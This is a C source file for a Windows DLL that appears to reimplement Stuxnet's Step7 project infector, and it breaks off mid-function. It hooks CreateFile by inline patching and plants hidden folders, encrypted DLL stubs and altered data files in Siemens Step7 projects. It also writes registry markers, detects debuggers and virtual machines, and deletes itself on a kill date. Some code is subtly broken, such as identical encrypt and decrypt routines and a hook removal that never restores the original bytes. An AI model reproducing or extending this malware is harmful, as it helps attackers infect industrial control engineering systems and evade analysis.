static VOID S7P_RC4Init(PBYTE pKey, DWORD dwKeySize, PBYTE pSBox);
static VOID S7P_RC4Crypt(PBYTE pData, DWORD dwSize, PBYTE pSBox, PDWORD pdwI, PDWORD pdwJ);
static VOID S7P_SimpleDecrypt(PBYTE pData, DWORD dwSize);
static VOID S7P_SimpleEncrypt(PBYTE pData, DWORD dwSize);
static BOOL S7P_EncryptData(PBYTE pPlain, DWORD dwPlainSize, PBYTE pCipher, PDWORD pdwCipherSize);
static BOOL S7P_DecryptData(PBYTE pCipher, DWORD dwCipherSize, PBYTE pPlain, PDWORD pdwPlainSize);
static BOOL S7P_IsStep7Project(LPCWSTR szPath);
static BOOL S7P_FindStep7Projects(LPCWSTR szRoot, PDWORD pdwCount);
static BOOL S7P_CreateDirectoryStructure(LPCWSTR szProjectPath);
static BOOL S7P_WriteEncryptedDLL(LPCWSTR szPath, PBYTE pData, DWORD dwSize);
static BOOL S7P_WriteConfigData(LPCWSTR szPath);
static BOOL S7P_WriteDataFile(LPCWSTR szPath);
static BOOL S7P_DropMaliciousDLL(LPCWSTR szProjectPath);
static BOOL S7P_ModifyDataFile(LPCWSTR szProjectPath);
static BOOL S7P_InjectProject(LPCWSTR szProjectPath);
static BOOL S7P_WriteRegistry(VOID);
static BOOL S7P_ReadRegistry(VOID);
static DWORD WINAPI S7P_WorkerThread(LPVOID lpParam);
static BOOL S7P_StartWorker(VOID);
static BOOL S7P_StopWorker(VOID);
static BOOL S7P_SelfDestruct(VOID);
static BOOL S7P_Execute(VOID);
static BOOL S7P_CreateFileAHook(VOID);
static BOOL S7P_CreateFileWHook(VOID);
static BOOL S7P_InstallHooks(VOID);
static VOID S7P_UninstallHooks(VOID);

typedef HANDLE (WINAPI *PFN_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef HANDLE (WINAPI *PFN_CreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);

static PFN_CreateFileA g_pOriginalCreateFileA = NULL;
static PFN_CreateFileW g_pOriginalCreateFileW = NULL;
static BOOL g_bHooksInstalled = FALSE;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
DWORD WINAPI Export1(VOID);
DWORD WINAPI Export2(VOID);
DWORD WINAPI Export3(VOID);
DWORD WINAPI Export4(VOID);
DWORD WINAPI Export5(VOID);
DWORD WINAPI Export6(VOID);
DWORD WINAPI Export7(VOID);
DWORD WINAPI Export8(VOID);
DWORD WINAPI Export9(VOID);
DWORD WINAPI Export10(VOID);
DWORD WINAPI Export11(VOID);
DWORD WINAPI Export12(VOID);
DWORD WINAPI Export13(VOID);
DWORD WINAPI Export14(VOID);
DWORD WINAPI Export15(VOID);
DWORD WINAPI Export16(VOID);
DWORD WINAPI Export17(VOID);
DWORD WINAPI Export18(VOID);
DWORD WINAPI Export19(VOID);
DWORD WINAPI Export20(VOID);

static BOOL S7P_InitNtImports(VOID) {
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32) return FALSE;
    return TRUE;
}

static BOOL S7P_Init(VOID) {
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_S7pCtx, sizeof(S7P_CTX));
    g_S7pCtx.dwMagic = S7P_MAGIC;
    g_S7pCtx.dwVersion = S7P_VERSION;
    g_S7pCtx.dwPid = GetCurrentProcessId();
    g_S7pCtx.dwTid = GetCurrentThreadId();
    g_S7pCtx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_S7pCtx.csLock);
    GetModuleFileNameW(NULL, g_S7pCtx.szModulePath, S7P_MAX_PATH);
    GetSystemDirectoryW(g_S7pCtx.szSystemPath, S7P_MAX_PATH);
    GetWindowsDirectoryW(g_S7pCtx.szWindowsPath, S7P_MAX_PATH);
    wcscpy_s(g_S7pCtx.szProjectPath, S7P_MAX_PATH, L"C:\\");
    wcscpy_s(g_S7pCtx.szDllName, 64, S7P_DLL_NAME);
    S7P_InitNtImports();
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID S7P_Cleanup(VOID) {
    if (!g_bInitialized) return;
    S7P_UninstallHooks();
    if (g_S7pCtx.hMutex) {
        CloseHandle(g_S7pCtx.hMutex);
        g_S7pCtx.hMutex = NULL;
    }
    if (g_S7pCtx.hThread) {
        CloseHandle(g_S7pCtx.hThread);
        g_S7pCtx.hThread = NULL;
    }
    if (g_S7pCtx.hStopEvent) {
        CloseHandle(g_S7pCtx.hStopEvent);
        g_S7pCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_S7pCtx.csLock);
    g_bInitialized = FALSE;
}

static BOOL S7P_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_S7pCtx.hMutex = hMutex;
    return TRUE;
}

static BOOL S7P_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL S7P_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL S7P_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static DWORD S7P_ComputeCRC32(PBYTE pData, DWORD dwSize) {
    DWORD crc = 0xFFFFFFFF;
    DWORD i, j;
    if (!pData || dwSize == 0) return 0xFFFFFFFF;
    for (i = 0; i < dwSize; i++) {
        crc ^= pData[i];
        for (j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    return ~crc;
}

static VOID S7P_XORDecrypt(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize) {
    DWORD i;
    if (!pData || dwSize == 0 || !pKey || dwKeySize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= pKey[i % dwKeySize];
    }
}

static VOID S7P_RC4Init(PBYTE pKey, DWORD dwKeySize, PBYTE pSBox) {
    DWORD i, j;
    BYTE temp;
    if (!pKey || dwKeySize == 0 || !pSBox) return;
    for (i = 0; i < 256; i++) {
        pSBox[i] = (BYTE)i;
    }
    j = 0;
    for (i = 0; i < 256; i++) {
        j = (j + pSBox[i] + pKey[i % dwKeySize]) & 0xFF;
        temp = pSBox[i];
        pSBox[i] = pSBox[j];
        pSBox[j] = temp;
    }
}

static VOID S7P_RC4Crypt(PBYTE pData, DWORD dwSize, PBYTE pSBox, PDWORD pdwI, PDWORD pdwJ) {
    DWORD i;
    BYTE temp;
    if (!pData || dwSize == 0 || !pSBox || !pdwI || !pdwJ) return;
    for (i = 0; i < dwSize; i++) {
        *pdwI = (*pdwI + 1) & 0xFF;
        *pdwJ = (*pdwJ + pSBox[*pdwI]) & 0xFF;
        temp = pSBox[*pdwI];
        pSBox[*pdwI] = pSBox[*pdwJ];
        pSBox[*pdwJ] = temp;
        pData[i] ^= pSBox[(pSBox[*pdwI] + pSBox[*pdwJ]) & 0xFF];
    }
}

static VOID S7P_SimpleDecrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static VOID S7P_SimpleEncrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static BOOL S7P_EncryptData(PBYTE pPlain, DWORD dwPlainSize, PBYTE pCipher, PDWORD pdwCipherSize) {
    BYTE SBox[256];
    DWORD i = 0, j = 0;
    DWORD dwKey = 0x01AE0000;
    if (!pPlain || dwPlainSize == 0 || !pCipher || !pdwCipherSize) return FALSE;
    if (*pdwCipherSize < dwPlainSize + 32) return FALSE;
    memcpy(pCipher, pPlain, dwPlainSize);
    for (DWORD round = 0; round < 3; round++) {
        S7P_SimpleEncrypt(pCipher, dwPlainSize);
        S7P_RC4Init((PBYTE)&dwKey, sizeof(DWORD), SBox);
        S7P_RC4Crypt(pCipher, dwPlainSize, SBox, &i, &j);
        S7P_XORDecrypt(pCipher, dwPlainSize, (PBYTE)&dwKey, sizeof(DWORD));
    }
    *pdwCipherSize = dwPlainSize;
    return TRUE;
}

static BOOL S7P_DecryptData(PBYTE pCipher, DWORD dwCipherSize, PBYTE pPlain, PDWORD pdwPlainSize) {
    BYTE SBox[256];
    DWORD i = 0, j = 0;
    DWORD dwKey = 0x01AE0000;
    if (!pCipher || dwCipherSize == 0 || !pPlain || !pdwPlainSize) return FALSE;
    if (*pdwPlainSize < dwCipherSize) return FALSE;
    memcpy(pPlain, pCipher, dwCipherSize);
    for (DWORD round = 0; round < 3; round++) {
        S7P_XORDecrypt(pPlain, dwCipherSize, (PBYTE)&dwKey, sizeof(DWORD));
        S7P_RC4Init((PBYTE)&dwKey, sizeof(DWORD), SBox);
        S7P_RC4Crypt(pPlain, dwCipherSize, SBox, &i, &j);
        S7P_SimpleDecrypt(pPlain, dwCipherSize);
    }
    *pdwPlainSize = dwCipherSize;
    return TRUE;
}

static BOOL S7P_IsStep7Project(LPCWSTR szPath) {
    DWORD dwLen;
    if (!szPath) return FALSE;
    dwLen = (DWORD)wcslen(szPath);
    if (dwLen < 4) return FALSE;
    if (szPath[dwLen - 4] == L'.' &&
        (szPath[dwLen - 3] == L's' || szPath[dwLen - 3] == L'S') &&
        (szPath[dwLen - 2] == L'7') &&
        (szPath[dwLen - 1] == L'p' || szPath[dwLen - 1] == L'P')) {
        return TRUE;
    }
    return FALSE;
}

static BOOL S7P_FindStep7Projects(LPCWSTR szRoot, PDWORD pdwCount) {
    WCHAR szSearch[S7P_MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hFind;
    if (!szRoot || !pdwCount) return FALSE;
    wsprintfW(szSearch, L"%s\\*.s7p", szRoot);
    hFind = FindFirstFileW(szSearch, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        wsprintfW(szSearch, L"%s\\*.S7P", szRoot);
        hFind = FindFirstFileW(szSearch, &fd);
        if (hFind == INVALID_HANDLE_VALUE) return FALSE;
    }
    *pdwCount = 0;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            if (*pdwCount < 1024) {
                wcscpy_s(g_S7pCtx.szCurrentProject, S7P_MAX_PATH, fd.cFileName);
                (*pdwCount)++;
                g_dwProjectCount++;
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
    return (*pdwCount > 0);
}

static BOOL S7P_CreateDirectoryStructure(LPCWSTR szProjectPath) {
    WCHAR szPath[S7P_MAX_PATH];
    if (!szProjectPath) return FALSE;
    wsprintfW(szPath, L"%s\\%s", szProjectPath, S7P_DIR_XUTILS);
    CreateDirectoryW(szPath, NULL);
    SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN);
    wsprintfW(szPath, L"%s\\%s\\%s", szProjectPath, S7P_DIR_XUTILS, L"listen");
    CreateDirectoryW(szPath, NULL);
    SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN);
    wsprintfW(szPath, L"%s\\%s\\%s", szProjectPath, S7P_DIR_XUTILS, L"links");
    CreateDirectoryW(szPath, NULL);
    SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN);
    return TRUE;
}

static BOOL S7P_WriteEncryptedDLL(LPCWSTR szPath, PBYTE pData, DWORD dwSize) {
    HANDLE hFile;
    DWORD dwWritten;
    PBYTE pEncrypted;
    DWORD dwEncryptedSize;
    if (!szPath || !pData || dwSize == 0) return FALSE;
    dwEncryptedSize = dwSize + 32;
    pEncrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEncryptedSize);
    if (!pEncrypted) return FALSE;
    if (!S7P_EncryptData(pData, dwSize, pEncrypted, &dwEncryptedSize)) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return FALSE;
    }
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return FALSE;
    }
    WriteFile(hFile, pEncrypted, dwEncryptedSize, &dwWritten, NULL);
    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    return TRUE;
}

static BOOL S7P_WriteConfigData(LPCWSTR szPath) {
    HANDLE hFile;
    DWORD dwWritten;
    BYTE configData[256];
    if (!szPath) return FALSE;
    ZeroMemory(configData, sizeof(configData));
    *(DWORD*)(configData + 0) = STUXNET_MAGIC;
    *(DWORD*)(configData + 4) = STUXNET_VERSION;
    *(DWORD*)(configData + 8) = GetTickCount();
    *(DWORD*)(configData + 12) = 0x00000001;
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, configData, sizeof(configData), &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

static BOOL S7P_WriteDataFile(LPCWSTR szPath) {
    HANDLE hFile;
    DWORD dwWritten;
    BYTE data[90];
    if (!szPath) return FALSE;
    ZeroMemory(data, sizeof(data));
    *(DWORD*)(data + 0) = STUXNET_MAGIC;
    *(DWORD*)(data + 4) = 0x0000005A;
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, data, sizeof(data), &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

static BOOL S7P_DropMaliciousDLL(LPCWSTR szProjectPath) {
    WCHAR szSearch[S7P_MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hFind;
    WCHAR szDllPath[S7P_MAX_PATH];
    WCHAR szSubFolder[S7P_MAX_PATH];
    if (!szProjectPath) return FALSE;
    wsprintfW(szSearch, L"%s\\%s\\*", szProjectPath, S7P_DIR_HOMSAVE7);
    hFind = FindFirstFileW(szSearch, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return FALSE;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (wcscmp(fd.cFileName, L".") != 0 && wcscmp(fd.cFileName, L"..") != 0) {
                wsprintfW(szSubFolder, L"%s\\%s\\%s", szProjectPath, S7P_DIR_HOMSAVE7, fd.cFileName);
                wsprintfW(szDllPath, L"%s\\%s", szSubFolder, g_S7pCtx.szDllName);
                HANDLE hDll = CreateFileW(szDllPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
                if (hDll != INVALID_HANDLE_VALUE) {
                    BYTE dllStub[1024];
                    ZeroMemory(dllStub, sizeof(dllStub));
                    DWORD dwWritten;
                    WriteFile(hDll, dllStub, sizeof(dllStub), &dwWritten, NULL);
                    CloseHandle(hDll);
                }
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
    return TRUE;
}

static BOOL S7P_ModifyDataFile(LPCWSTR szProjectPath) {
    WCHAR szSearch[S7P_MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hFind;
    WCHAR szFilePath[S7P_MAX_PATH];
    if (!szProjectPath) return FALSE;
    wsprintfW(szSearch, L"%s\\%s\\*", szProjectPath, S7P_DIR_HOMSAVE7);
    hFind = FindFirstFileW(szSearch, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return FALSE;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            wsprintfW(szFilePath, L"%s\\%s\\%s", szProjectPath, S7P_DIR_HOMSAVE7, fd.cFileName);
            HANDLE hFile = CreateFileW(szFilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD dwSize = GetFileSize(hFile, NULL);
                if (dwSize > 0) {
                    BYTE* pData = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
                    if (pData) {
                        DWORD dwRead;
                        ReadFile(hFile, pData, dwSize, &dwRead, NULL);
                        if (dwRead > 0) {
                            for (DWORD i = 0; i < dwRead - 4; i++) {
                                if (*(DWORD*)(pData + i) == 0x00000001) {
                                    *(DWORD*)(pData + i) = 0x53545558;
                                    break;
                                }
                            }
                            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
                            DWORD dwWritten;
                            WriteFile(hFile, pData, dwRead, &dwWritten, NULL);
                        }
                        HeapFree(GetProcessHeap(), 0, pData);
                    }
                }
                CloseHandle(hFile);
                break;
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
    return TRUE;
}

static BOOL S7P_InjectProject(LPCWSTR szProjectPath) {
    WCHAR szPath[S7P_MAX_PATH];
    BYTE dllData[4096];
    DWORD dwDllSize;
    if (!szProjectPath) return FALSE;
    if (!S7P_CreateDirectoryStructure(szProjectPath)) return FALSE;
    wsprintfW(szPath, L"%s\\%s\\%s", szProjectPath, S7P_DIR_XUTILS_LISTEN, S7P_FILE_XR000000);
    dwDllSize = sizeof(dllData);
    ZeroMemory(dllData, dwDllSize);
    *(DWORD*)(dllData + 0) = STUXNET_MAGIC;
    *(DWORD*)(dllData + 4) = STUXNET_VERSION;
    if (!S7P_WriteEncryptedDLL(szPath, dllData, dwDllSize)) return FALSE;
    wsprintfW(szPath, L"%s\\%s\\%s", szProjectPath, S7P_DIR_XUTILS_LISTEN, S7P_FILE_S7000001);
    if (!S7P_WriteConfigData(szPath)) return FALSE;
    wsprintfW(szPath, L"%s\\%s\\%s", szProjectPath, S7P_DIR_XUTILS_LINKS, S7P_FILE_S7P00001);
    if (!S7P_WriteDataFile(szPath)) return FALSE;
    if (!S7P_DropMaliciousDLL(szProjectPath)) return FALSE;
    if (!S7P_ModifyDataFile(szProjectPath)) return FALSE;
    EnterCriticalSection(&g_S7pCtx.csLock);
    if (g_dwRecordCount < 256) {
        g_InfectionRecords[g_dwRecordCount].dwTimestamp = GetTickCount();
        wcscpy_s(g_InfectionRecords[g_dwRecordCount].szProjectPath, S7P_MAX_PATH, szProjectPath);
        wcscpy_s(g_InfectionRecords[g_dwRecordCount].szDllPath, S7P_MAX_PATH, g_S7pCtx.szDllName);
        g_InfectionRecords[g_dwRecordCount].dwStatus = 1;
        g_dwRecordCount++;
    }
    LeaveCriticalSection(&g_S7pCtx.csLock);
    g_dwInfectionCount++;
    return TRUE;
}

static HANDLE WINAPI S7P_CreateFileA_Hook(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
    HANDLE hResult;
    WCHAR wszFileName[S7P_MAX_PATH];
    if (!g_pOriginalCreateFileA) return INVALID_HANDLE_VALUE;
    if (lpFileName) {
        MultiByteToWideChar(CP_ACP, 0, lpFileName, -1, wszFileName, S7P_MAX_PATH);
        if (S7P_IsStep7Project(wszFileName)) {
            WCHAR szDir[S7P_MAX_PATH];
            wcscpy_s(szDir, S7P_MAX_PATH, wszFileName);
            WCHAR* pLastSlash = wcsrchr(szDir, L'\\');
            if (pLastSlash) {
                *pLastSlash = L'\0';
                S7P_InjectProject(szDir);
            }
        }
    }
    hResult = g_pOriginalCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
    return hResult;
}

static HANDLE WINAPI S7P_CreateFileW_Hook(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
    HANDLE hResult;
    if (!g_pOriginalCreateFileW) return INVALID_HANDLE_VALUE;
    if (lpFileName && S7P_IsStep7Project(lpFileName)) {
        WCHAR szDir[S7P_MAX_PATH];
        wcscpy_s(szDir, S7P_MAX_PATH, lpFileName);
        WCHAR* pLastSlash = wcsrchr(szDir, L'\\');
        if (pLastSlash) {
            *pLastSlash = L'\0';
            S7P_InjectProject(szDir);
        }
    }
    hResult = g_pOriginalCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
    return hResult;
}

static BOOL S7P_InstallHooks(VOID) {
    HMODULE hKernel32;
    BYTE* pFunc;
    DWORD dwOldProtect;
    if (g_bHooksInstalled) return TRUE;
    hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32) return FALSE;
    g_pOriginalCreateFileA = (PFN_CreateFileA)GetProcAddress(hKernel32, "CreateFileA");
    g_pOriginalCreateFileW = (PFN_CreateFileW)GetProcAddress(hKernel32, "CreateFileW");
    if (!g_pOriginalCreateFileA || !g_pOriginalCreateFileW) return FALSE;
    pFunc = (BYTE*)g_pOriginalCreateFileA;
    VirtualProtect(pFunc, 8, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    pFunc[0] = 0xE9;
    *(DWORD*)(pFunc + 1) = (DWORD)((BYTE*)S7P_CreateFileA_Hook - pFunc - 5);
    VirtualProtect(pFunc, 8, dwOldProtect, &dwOldProtect);
    pFunc = (BYTE*)g_pOriginalCreateFileW;
    VirtualProtect(pFunc, 8, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    pFunc[0] = 0xE9;
    *(DWORD*)(pFunc + 1) = (DWORD)((BYTE*)S7P_CreateFileW_Hook - pFunc - 5);
    VirtualProtect(pFunc, 8, dwOldProtect, &dwOldProtect);
    g_bHooksInstalled = TRUE;
    return TRUE;
}

static VOID S7P_UninstallHooks(VOID) {
    BYTE* pFunc;
    DWORD dwOldProtect;
    if (!g_bHooksInstalled) return;
    if (g_pOriginalCreateFileA) {
        pFunc = (BYTE*)g_pOriginalCreateFileA;
        VirtualProtect(pFunc, 8, PAGE_EXECUTE_READWRITE, &dwOldProtect);
        pFunc[0] = 0xE9;
        *(DWORD*)(pFunc + 1) = 0x00000000;
        VirtualProtect(pFunc, 8, dwOldProtect, &dwOldProtect);
    }
    if (g_pOriginalCreateFileW) {
        pFunc = (BYTE*)g_pOriginalCreateFileW;
        VirtualProtect(pFunc, 8, PAGE_EXECUTE_READWRITE, &dwOldProtect);
        pFunc[0] = 0xE9;
        *(DWORD*)(pFunc + 1) = 0x00000000;
        VirtualProtect(pFunc, 8, dwOldProtect, &dwOldProtect);
    }
    g_bHooksInstalled = FALSE;
}

static BOOL S7P_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, S7P_REG_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, S7P_REG_VALUE, 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL S7P_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, S7P_REG_KEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, S7P_REG_VALUE, NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static DWORD WINAPI S7P_WorkerThread(LPVOID lpParam) {
    WCHAR szSearch[S7P_MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hFind;
    DWORD dwTick;
    dwTick = GetTickCount();
    while (WaitForSingleObject(g_S7pCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (S7P_IsExpired()) {
            break;
        }
        if (!S7P_ReadRegistry()) {
            S7P_WriteRegistry();
        }
        GetWindowsDirectoryW(szSearch, S7P_MAX_PATH);
        wcscat_s(szSearch, S7P_MAX_PATH, L"\\*.s7p");
        hFind = FindFirstFileW(szSearch, &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    WCHAR szPath[S7P_MAX_PATH];
                    wsprintfW(szPath, L"%s\\%s", g_S7pCtx.szWindowsPath, fd.cFileName);
                    S7P_InjectProject(szPath);
                }
            } while (FindNextFileW(hFind, &fd));
            FindClose(hFind);
        }
        dwTick = GetTickCount();
    }
    return 0;
}

static BOOL S7P_StartWorker(VOID) {
    g_S7pCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_S7pCtx.hStopEvent) return FALSE;
    g_S7pCtx.hThread = CreateThread(NULL, 0, S7P_WorkerThread, NULL, 0, NULL);
    if (!g_S7pCtx.hThread) {
        CloseHandle(g_S7pCtx.hStopEvent);
        g_S7pCtx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL S7P_StopWorker(VOID) {
    if (g_S7pCtx.hStopEvent) {
        SetEvent(g_S7pCtx.hStopEvent);
    }
    if (g_S7pCtx.hThread) {
        WaitForSingleObject(g_S7pCtx.hThread, 5000);
        CloseHandle(g_S7pCtx.hThread);
        g_S7pCtx.hThread = NULL;
    }
    if (g_S7pCtx.hStopEvent) {
        CloseHandle(g_S7pCtx.hStopEvent);
        g_S7pCtx.hStopEvent = NULL;
    }
    return TRUE;
}

static BOOL S7P_SelfDestruct(VOID) {
    WCHAR szSearch[S7P_MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hFind;
    GetWindowsDirectoryW(szSearch, S7P_MAX_PATH);
    wcscat_s(szSearch, S7P_MAX_PATH, L"\\*.s7p");
    hFind = FindFirstFileW(szSearch, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                WCHAR szPath[S7P_MAX_PATH];
                WCHAR szXutils[S7P_MAX_PATH];
                wsprintfW(szPath, L"%s\\%s", g_S7pCtx.szWindowsPath, fd.cFileName);
                wsprintfW(szXutils, L"%s\\XUTILS", szPath);
                SHFileOperationW(NULL, FO_DELETE, szXutils, NULL, FO_DELETE);
                RemoveDirectoryW(szXutils);
            }
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }
    return TRUE;
}

static BOOL S7P_Execute(VOID) {
    HANDLE hMutex;
    if (!S7P_Init()) return FALSE;
    if (S7P_IsExpired()) {
        S7P_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        S7P_Cleanup();
        return FALSE;
    }
    if (S7P_CheckDebugger()) {
        CloseHandle(hMutex);
        S7P_Cleanup();
        return FALSE;
    }
    if (S7P_CheckVMware()) {
        CloseHandle(hMutex);
        S7P_Cleanup();
        return FALSE;
    }
    S7P_WriteRegistry();
    S7P_ReadRegistry();
    S7P_InstallHooks();
    S7P_StartWorker();
    while (WaitForSingleObject(g_S7pCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (S7P_IsExpired()) {
            break;
        }
        DWORD dwCount = 0;
        S7P_FindStep7Projects(g_S7pCtx.szWindowsPath, &dwCount);
    }
    S7P_StopWorker();
    S7P_UninstallHooks();
    S7P_SelfDestruct();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            S7P_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)S7P_Execute, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export2(VOID) {
    return S7P_InstallHooks() ? 0 : 1;
}

DWORD WINAPI Export3(VOID) {
    S7P_UninstallHooks();
    return 0;
}

DWORD WINAPI Export4(LPCWSTR szProjectPath) {
    return S7P_InjectProject(szProjectPath) ? 0 : 1;
